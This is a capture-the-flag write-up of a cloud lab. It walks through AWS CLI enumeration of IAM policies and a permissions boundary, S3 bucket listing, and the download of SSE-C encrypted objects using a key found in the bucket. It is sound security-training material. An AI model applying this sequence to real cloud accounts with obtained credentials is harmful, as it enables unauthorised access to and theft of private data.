---
title: CWL - KeyMaster (Decoding S3 Secrets)
date: '2026-02-14'
tags: ['cyberwarfarelabs', 'cloud', 'aws', 'awscli', 'kms']
draft: false
summary:  The challenge provides Access Keys that allows for IAM enumeration that leads to an additional user policy from the Permission Boundary. The policy allows for a specific S3 bucket enumeration. From there, a KMS decryption key was found and is used to decrypt and download unauthorized sensitive files such as the flag
images: /static/images/cyberwarfare/cloud/decoding_s3_secrets/decoding_s3_secrets.png
---

<div className="flex justify-center">
	<img src="/static/images/cyberwarfare/cloud/decoding_s3_secrets/decoding_s3_secrets.png" alt="Description" />
</div>


<div className="flex justify-center">
	<img src="/static/images/cyberwarfare/cloud/decoding_s3_secrets/decoding_s3_secrets2.png" alt="Description" />
</div>


<TOCInline toc={props.toc} asDisclosure />



---


## Recon


We are given the following credentials:

![Description](/static/images/cyberwarfare/cloud/decoding_s3_secrets/1.png)


Proceed to authenticate. Just provide any random region and we can leave out the output format field

```bash
aws configure
```

![Description](/static/images/cyberwarfare/cloud/decoding_s3_secrets/2.png)


Verify the authentication by making an API call

```bash
aws sts get-caller-identity
```

![Description](/static/images/cyberwarfare/cloud/decoding_s3_secrets/3.png)


Our current user is `BackupReader1`







## IAM Enumeration


We are able to list user policies

```bash
aws iam list-user-policies --user-name BackupReader1
```

```JSON
{
    "PolicyNames": [
        "admin-policy",
        "EnableS3BackupRead",
        "FullAccessPolicy",
        "KMSDecryptOnly",
        "KMSFullAccessPolicy",
        "S3FullAccessAllBuckets",
        "S3KMSBackupAccess",
        "SelfS3KMSAccess",
        "test-policy"
    ]
}
```

Looks like we have some interesting permissions here such as `KMSDecryptOnly`, which when looking back at the attack flow earlier, we can assume thta we are dealing with AWS KMS which is (Key Management Service)
which is a service to encrypt S3 object data


We continue to enumerate attached-user policies

```bash
aws iam list-attached-user-policies --user-name BackupReader1
```

```JSON
{
    "AttachedPolicies": [
        {
            "PolicyName": "UserPolicy",
            "PolicyArn": "arn:aws:iam::058264439561:policy/UserPolicy"
        }
    ]
}
```

Acquire the version ID using the Policy ARN so we can inspect the contents of the policy


```bash
aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/UserPolicy
```

![Description](/static/images/cyberwarfare/cloud/decoding_s3_secrets/4.png)



Inspecting the contents of the policy, we discover more interesting permissions

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/UserPolicy --version-id v1
```

![Description](/static/images/cyberwarfare/cloud/decoding_s3_secrets/5.png)


The current user is able to write user policies, this could potentially be used to escalate privileges. The 2'nd permission allowing us
to retrieve information about the current user


```bash
aws iam get-user
```

```JSON
{
    "User": {
        "Path": "/",
        "UserName": "BackupReader1",
        "UserId": "AIDAQ3EGUZME24ILVB44T",
        "Arn": "arn:aws:iam::058264439561:user/BackupReader1",
        "CreateDate": "2024-09-24T11:13:38+00:00",
        "PermissionsBoundary": {
            "PermissionsBoundaryType": "Policy",
            "PermissionsBoundaryArn": "arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy"
        },
        "Tags": [
            {
                "Key": "AllowSelfAssignS3KMS",
                "Value": "true"
            }
        ]
    }
}
```


The thing we need to oberve is the presence of a permission boundary policy called `PermissionBoundaryPolicy`(literally). A permissions boundary is 
an advanced feature that uses managed policy to limit the access of an IAM entity.




### Permissions Boundary Enumeration


Just like any policies, we will also enumerate the permission boundary policy. First get the version ID.

```bash
aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy
```

![Description](/static/images/cyberwarfare/cloud/decoding_s3_secrets/6.png)


The inspect the contents of the policy

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy --version-id v3
```

```JSON
{
    "Action": [
        "s3:ListBucket",
        "s3:GetObject"
    ],
    "Effect": "Allow",
    "Resource": [
        "arn:aws:s3:::securecopbakupbuk1",
        "arn:aws:s3:::securecopbakupbuk1/*"
    ]
  },
  {
    "Action": [
        "kms:Decrypt"
    ],
    "Effect": "Allow",
    "Resource": "arn:aws:kms:us-east-1:058264439561:key/a7a251b3-c889-4dd1-9176-931c207c33d5"
    }
```


Above is just the important snippet of the whole output. We can see this policy allows us to list and download objects from the
`securecopbakupbuk1` bucket. Apart from that we can confirm from the action, `kms:Decrypt` that we can decrypt KMS objects if we have the decryption keys.



## Enumerating S3 Buckets

```bash
aws s3 ls securecopbakupbuk1
```

![Description](/static/images/cyberwarfare/cloud/decoding_s3_secrets/7.png)


We see some interesting and potentially sensitive files here, let's try to download them


```bash
aws s3 cp s3://securecopbakupbuk1/key.txt key.txt
```

![Description](/static/images/cyberwarfare/cloud/decoding_s3_secrets/8.png)


This looks like our KMS keys which are also Server-side Encryption KMS keys (SSE-KMS). Attempting to download the files other than `key.txt` will result
in an error


![Description](/static/images/cyberwarfare/cloud/decoding_s3_secrets/9.png)






## Decrypting KMS

This is because the objects are encrypted, we need to decrypt it using the discovered encryption key and its digest.
Only then, the files can be downloaded


```bash
aws s3api get-object --bucket securecopbakupbuk1 --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g== --key env.txt env.txt
```


Using this command, we specify:

- The bucket name
- The algorithm which is `AES256`
- The key
- The key MD5 digest
- The file we want to decrypt and download. In this case, it is `env.txt`


After running the command, we will get this output below signifying the decrypting was a success and the file was downloaded


```JSON
{
    "AcceptRanges": "bytes",
    "LastModified": "2024-09-24T11:18:40+00:00",
    "ContentLength": 411,
    "ETag": "\"749eb3a7b32276781c2da504dc6bdff8\"",
    "ContentType": "binary/octet-stream",
    "Metadata": {},
    "SSECustomerAlgorithm": "AES256",
    "SSECustomerKeyMD5": "ESUzbd203tahLpxvA6LL4g=="
}
```


![Description](/static/images/cyberwarfare/cloud/decoding_s3_secrets/10.png)



---

## Sources

- https://www.scaleway.com/en/docs/object-storage/api-cli/enable-sse-c/#how-to-upload-and-download-objects-with-sse-c
- https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html